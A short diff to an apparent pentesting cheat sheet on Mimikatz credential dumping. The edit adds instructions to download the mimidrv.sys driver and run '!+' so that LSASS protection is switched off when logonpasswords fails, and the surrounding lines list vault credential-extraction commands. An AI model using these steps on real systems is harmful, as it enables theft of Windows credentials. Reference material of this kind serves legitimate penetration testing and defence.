@@ -18,7 +18,7 @@ vault::cred    //vault credentials
 vault::list    //credman plaintext passwords
 ```
 
-if the logonpassword command returns an error `Handle on memory (0x00000005)` use the following commands in Mimikatz to disable LSASS protection
+if the logonpassword command returns an error `Handle on memory (0x00000005)` download the library from [here](https://github.com/ParrotSec/mimikatz/raw/master/Win32/mimidrv.sys) (Win32) or [here](https://github.com/ParrotSec/mimikatz/raw/master/x64/mimidrv.sys) (Win64) in the same folder as the mimikaz executable and use the following commands in Mimikatz to disable LSASS protection
 
 ```
 !+
